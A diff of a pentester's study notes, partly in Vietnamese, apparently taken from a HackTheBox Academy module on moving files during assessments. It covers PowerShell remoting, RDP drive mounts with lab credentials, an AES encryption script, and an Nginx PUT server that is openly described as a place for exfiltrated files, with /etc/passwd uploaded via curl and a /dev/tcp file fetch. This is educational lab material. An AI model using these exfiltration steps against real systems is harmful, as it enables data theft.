@@ -566,6 +566,298 @@ Ncat - Sending File as Input to Ncat
 Compromised Machine Connecting to Netcat Using /dev/tcp to Receive the File
   victim@target:~$ cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe
 
+PowerShell Session File Transfer
+Trường hợp  HTTP, HTTPS, or SMB are unavailable -> dùng powershell Remoting
+
+From DC01 - Confirm WinRM port TCP 5985 is Open on DATABASE01.
+  PS C:\htb> whoami
+    htb\administrator
+  PS C:\htb> hostname
+    DC01
+  PS C:\htb> Test-NetConnection -ComputerName DATABASE01 -Port 5985
+    ComputerName     : DATABASE01
+    RemoteAddress    : 192.168.1.101
+    RemotePort       : 5985
+    InterfaceAlias   : Ethernet0
+    SourceAddress    : 192.168.1.100
+    TcpTestSucceeded : True
+
+Create a PowerShell Remoting Session to DATABASE01
+  PS C:\htb> $Session = New-PSSession -ComputerName DATABASE01
+
+Copy samplefile.txt from our Localhost to the DATABASE01 Session
+  PS C:\htb> Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
+
+Copy DATABASE.txt from DATABASE01 Session to our Localhost
+  PS C:\htb> Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
+
+RDP (Remote Desktop Protocol) 
+
+Mounting a Linux Folder Using rdesktop
+we can use xfreerdp or rdesktop
+
+Mounting a Linux Folder Using rdesktop
+  naruto3co@htb[/htb]$ rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'
+Mounting a Linux Folder Using xfreerdp
+  naruto3co@htb[/htb]$ xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer
+
+After selecting the drive, we can interact with it in the remote session that follows.
+Note: This drive is not accessible to any other users logged on to the target computer, even if they manage to hijack the RDP session.
+
+=========================== END ===================================
+=========================== END ===================================
+=========================== END ===================================
+=========================== END ===================================
+=========================== END ===================================
+
+Practice Makes Perfect
+It's worth referencing this section or creating your own notes on these techniques and applying them to labs in other modules in the Penetration Tester Job Role Path and beyond. Some modules/sections where these could come in handy include:
+
+Active Directory Enumeration and Attacks - Skills Assessments 1 & 2
+Throughout the Pivoting, Tunnelling & Port Forwarding module
+Throughout the Attacking Enterprise Networks module
+Throughout the Shells & Payloads module
+
+You never know what you're up against until you start a lab (or real-world assessment). Once you master one technique in this section or other sections of this module, try another. By the time you finish the Penetration Tester Job Role Path, it would be great to have tried most, if not all, of these techniques. This will help with your "muscle memory" and give you ideas of how to upload/download files when you face a different environment with certain restrictions that make one easier method fail. In the next section, we'll discuss protecting our file transfers when dealing with sensitive data.
+
+
+
+=========================== END ===================================
+khi redteam nếu man thông tin đi thì phải mã hoá chứ k được truyền đi bản rõ nhất với thông tin nhạy cảm tránh làm lộ thông tin khách hàng. tạo ra sự thiếu chuyên nghiệp 
+
+Code mã hoá ví dụ 
+
+Invoke-AESEncryption.ps1
+
+===================================================== START Invoke-AESEncryption.ps1 =====================================================
+
+.EXAMPLE
+Invoke-AESEncryption -Mode Encrypt -Key "p@ssw0rd" -Text "Secret Text" 
+
+Description
+-----------
+Encrypts the string "Secret Test" and outputs a Base64 encoded ciphertext.
+ 
+.EXAMPLE
+Invoke-AESEncryption -Mode Decrypt -Key "p@ssw0rd" -Text "LtxcRelxrDLrDB9rBD6JrfX/czKjZ2CUJkrg++kAMfs="
+ 
+Description
+-----------
+Decrypts the Base64 encoded string "LtxcRelxrDLrDB9rBD6JrfX/czKjZ2CUJkrg++kAMfs=" and outputs plain text.
+ 
+.EXAMPLE
+Invoke-AESEncryption -Mode Encrypt -Key "p@ssw0rd" -Path file.bin
+ 
+Description
+-----------
+Encrypts the file "file.bin" and outputs an encrypted file "file.bin.aes"
+ 
+.EXAMPLE
+Invoke-AESEncryption -Mode Decrypt -Key "p@ssw0rd" -Path file.bin.aes
+ 
+Description
+-----------
+Decrypts the file "file.bin.aes" and outputs an encrypted file "file.bin"
+#>
+function Invoke-AESEncryption {
+    [CmdletBinding()]
+    [OutputType([string])]
+    Param
+    (
+        [Parameter(Mandatory = $true)]
+        [ValidateSet('Encrypt', 'Decrypt')]
+        [String]$Mode,
+
+        [Parameter(Mandatory = $true)]
+        [String]$Key,
+
+        [Parameter(Mandatory = $true, ParameterSetName = "CryptText")]
+        [String]$Text,
+
+        [Parameter(Mandatory = $true, ParameterSetName = "CryptFile")]
+        [String]$Path
+    )
+
+    Begin {
+        $shaManaged = New-Object System.Security.Cryptography.SHA256Managed
+        $aesManaged = New-Object System.Security.Cryptography.AesManaged
+        $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
+        $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
+        $aesManaged.BlockSize = 128
+        $aesManaged.KeySize = 256
+    }
+
+    Process {
+        $aesManaged.Key = $shaManaged.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($Key))
+
+        switch ($Mode) {
+            'Encrypt' {
+                if ($Text) {$plainBytes = [System.Text.Encoding]::UTF8.GetBytes($Text)}
+                
+                if ($Path) {
+                    $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
+                    if (!$File.FullName) {
+                        Write-Error -Message "File not found!"
+                        break
+                    }
+                    $plainBytes = [System.IO.File]::ReadAllBytes($File.FullName)
+                    $outPath = $File.FullName + ".aes"
+                }
+
+                $encryptor = $aesManaged.CreateEncryptor()
+                $encryptedBytes = $encryptor.TransformFinalBlock($plainBytes, 0, $plainBytes.Length)
+                $encryptedBytes = $aesManaged.IV + $encryptedBytes
+                $aesManaged.Dispose()
+
+                if ($Text) {return [System.Convert]::ToBase64String($encryptedBytes)}
+                
+                if ($Path) {
+                    [System.IO.File]::WriteAllBytes($outPath, $encryptedBytes)
+                    (Get-Item $outPath).LastWriteTime = $File.LastWriteTime
+                    return "File encrypted to $outPath"
+                }
+            }
+
+            'Decrypt' {
+                if ($Text) {$cipherBytes = [System.Convert]::FromBase64String($Text)}
+                
+                if ($Path) {
+                    $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
+                    if (!$File.FullName) {
+                        Write-Error -Message "File not found!"
+                        break
+                    }
+                    $cipherBytes = [System.IO.File]::ReadAllBytes($File.FullName)
+                    $outPath = $File.FullName -replace ".aes"
+                }
+
+                $aesManaged.IV = $cipherBytes[0..15]
+                $decryptor = $aesManaged.CreateDecryptor()
+                $decryptedBytes = $decryptor.TransformFinalBlock($cipherBytes, 16, $cipherBytes.Length - 16)
+                $aesManaged.Dispose()
+
+                if ($Text) {return [System.Text.Encoding]::UTF8.GetString($decryptedBytes).Trim([char]0)}
+                
+                if ($Path) {
+                    [System.IO.File]::WriteAllBytes($outPath, $decryptedBytes)
+                    (Get-Item $outPath).LastWriteTime = $File.LastWriteTime
+                    return "File decrypted to $outPath"
+                }
+            }
+        }
+    }
+
+    End {
+        $shaManaged.Dispose()
+        $aesManaged.Dispose()
+    }
+}
+
+
+
+===================================================== END Invoke-AESEncryption.ps1 =====================================================
+
+We can use any previously shown file transfer methods to get this file onto a target host. After the script has been transferred, it only needs to be imported as a module, as shown below.
+
+Import Module Invoke-AESEncryption.ps1
+  PS C:\htb> Import-Module .\Invoke-AESEncryption.ps1
+
+  PS C:\htb> Invoke-AESEncryption -Mode Encrypt -Key "p4ssw0rd" -Path .\scan-results.txt
+    File encrypted to C:\htb\scan-results.txt.aes
+  PS C:\htb> ls
+        Directory: C:\htb
+    
+    Mode                 LastWriteTime         Length Name
+    ----                 -------------         ------ ----
+    -a----        11/18/2020  12:17 AM           9734 Invoke-AESEncryption.ps1
+    -a----        11/18/2020  12:19 PM           1724 scan-results.txt
+    -a----        11/18/2020  12:20 PM           3448 scan-results.txt.aes
+
+Using very strong and unique passwords for encryption for every company where a penetration test is performed is essential. This is to prevent sensitive files and information from being decrypted using one single password that may have been leaked and cracked by a third party.
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+File Encryption on Linux
+OpenSSL is frequently included in Linux distributions, with sysadmins using it to generate security certificates, among other tasks. OpenSSL can be used to send files "nc style" to encrypt files.
+
+To encrypt a file using openssl we can select different ciphers, see OpenSSL man page. Let's use -aes256 as an example. We can also override the default iterations counts with the option -iter 100000 and add the option -pbkdf2 to use the Password-Based Key Derivation Function 2 algorithm. When we hit enter, we'll need to provide a password.
+
+Encrypting /etc/passwd with openssl
+  naruto3co@htb[/htb]$ openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc
+    enter aes-256-cbc encryption password:                                                         
+    Verifying - enter aes-256-cbc encryption password:                             
+
+Decrypt passwd.enc with openssl
+  naruto3co@htb[/htb]$ openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd                    
+  enter aes-256-cbc decryption password:
+
+We can use any of the previous methods to transfer this file, but it's recommended to use a secure transport method such as HTTPS, SFTP, or SSH. As always, practice the examples in this section against target hosts in this or other modules and reproduce what you can (such as the openssl examples using the Pwnbox. The following section will cover different ways to transfer files over HTTP and HTTPS.
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+Có thể dùng Nginx để truyền tệp 
+
+Nginx - Enabling PUT
+
+Create a Directory to Handle Uploaded Files
+  naruto3co@htb[/htb]$ sudo mkdir -p /var/www/uploads/SecretUploadDirectory
+
+Change the Owner to www-data
+  naruto3co@htb[/htb]$ sudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory
+
+Create Nginx Configuration File
+Create the Nginx configuration file by creating the file /etc/nginx/sites-available/upload.conf with the contents:
+
+server {
+    listen 9001;
+    
+    location /SecretUploadDirectory/ {
+        root    /var/www/uploads;
+        dav_methods PUT;
+    }
+}
+
+Symlink our Site to the sites-enabled Directory
+  naruto3co@htb[/htb]$ sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/
+
+Start Nginx
+  naruto3co@htb[/htb]$ sudo systemctl restart nginx.service
+
+If we get any error messages, check /var/log/nginx/error.log. If using Pwnbox, we will see port 80 is already in use.
+Verifying Errors
+  1/17 16:11:56 [emerg] 5679#5679: still could not bind()
+
+  naruto3co@htb[/htb]$ tail -2 /var/log/nginx/error.log
+      
+      2020/11/17 16:11:56 [emerg] 5679#5679: bind() to 0.0.0.0:`80` failed (98: A`ddress already in use`)
+      2020/1.....
+
+  naruto3co@htb[/htb]$ ss -lnpt | grep 80
+  
+  LISTEN 0      100          0.0.0.0:80        0.0.0.0:*    users:(("python",pid=`2811`,fd=3),("python",pid=2070,fd=3),("python",pid=1968,fd=3),("python",pid=1856,fd=3))
+
+  naruto3co@htb[/htb]$ ps -ef | grep 2811
+  
+  user65      2811    1856  0 16:05 ?        00:00:04 `python -m websockify 80 localhost:5901 -D`
+  root        6720    2226  0 16:14 pts/0    00:00:00 grep --color=auto 2811
+
+We see there is already a module listening on port 80. To get around this, we can remove the default Nginx configuration, which binds on port 80.
+
+Remove NginxDefault Configuration
+  naruto3co@htb[/htb]$ sudo rm /etc/nginx/sites-enabled/default
+
+Now we can test uploading by using cURL to send a PUT request. In the below example, we will upload the /etc/passwd file to the server and call it users.txt
+
+Upload File Using cURL
+  naruto3co@htb[/htb]$ curl -T /etc/passwd http://localhost:9001/SecretUploadDirectory/users.txt
+  naruto3co@htb[/htb]$ sudo tail -1 /var/www/uploads/SecretUploadDirectory/users.txt 
+  user65:x:1000:1000:,,,:/home/user65:/bin/bash
+
+Once we have this working, a good test is to ensure the directory listing is not enabled by navigating to http://localhost/SecretUploadDirectory. By default, with Apache, if we hit a directory without an index file (index.html), it will list all the files. This is bad for our use case of exfilling files because most files are sensitive by nature, and we want to do our best to hide them. Thanks to Nginx being minimal, features like that are not enabled by default.
+
+Using Built-in Tools
+In the next section, we'll introduce the topic of "Living off the Land" or using built-in Windows and Linux utilities to perform file transfer activities. We will repeatedly come back to this concept throughout the modules in the Penetration Tester path when covering tasks such as Windows and Linux privilege escalation and Active Directory enumeration and exploitation.
+
 
 
 
